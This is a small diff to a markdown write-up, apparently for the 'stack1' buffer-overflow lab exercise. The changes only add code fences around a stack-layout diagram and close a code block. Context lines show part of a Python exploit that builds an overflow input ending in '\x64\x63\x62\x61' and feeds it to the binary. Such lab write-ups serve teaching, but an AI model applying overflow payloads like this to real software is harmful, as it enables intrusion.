@@ -52,7 +52,9 @@ int main(int argc, char **argv)
 
 ### Stack:
 
+```bash
 | eip | ebp | modified(0) |   buffer    |
+```
 
 ### The plan:
 
@@ -110,7 +112,9 @@ int main(int argc, char **argv)
 
 ### Stack:
 
+```bash
 | eip | ebp | modified(0) |   buffer    |
+```
 
 ### Plan:
 
@@ -133,3 +137,4 @@ input=fill+'\x64\x63\x62\x61'
 #################
 cproc = Popen(["./stack1",input], stdin=PIPE, stdout=PIPE)
 print cproc.communicate()[0]
+```
